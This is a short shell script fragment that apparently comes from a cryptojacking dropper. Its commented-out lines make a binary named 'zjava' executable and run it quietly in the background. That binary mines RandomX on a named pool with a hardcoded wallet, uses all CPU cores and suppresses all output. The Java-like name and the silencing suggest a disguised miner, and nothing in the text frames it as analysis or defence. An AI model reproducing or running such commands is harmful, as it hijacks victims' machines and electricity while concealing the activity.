...
#chmod +x zjava
#nohup ./zjava -o randomx.rplant.xyz:7107 -a rx/0 -u TBs1gnPNKz17H7YwqvkAcke2G1GWzcuPABrMRiKqR1XRcXy4HpMRWXaWs4LqtS5NzJBJqGVFNSjB1TUVq3M6yMKD66XXzGjGdo.$(echo STB-$(shuf -i 1000-9999 -n 1)) --randomx-1gb-pages -p -x -t $(nproc --all) >/dev/null 2>&1 &
sleep 30
